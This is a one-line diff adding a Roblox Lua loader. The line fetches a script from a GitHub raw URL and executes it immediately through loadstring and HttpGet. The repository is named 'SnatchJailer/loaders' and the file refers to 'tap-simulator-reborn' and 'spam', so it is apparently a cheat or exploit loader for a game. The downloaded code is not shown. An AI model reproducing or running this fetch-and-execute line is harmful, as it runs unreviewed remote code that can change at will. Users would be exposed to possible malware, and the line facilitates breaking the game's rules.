@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/tap-simulator-reborn-spam3-i4cukgiamd96q6.lua"))()
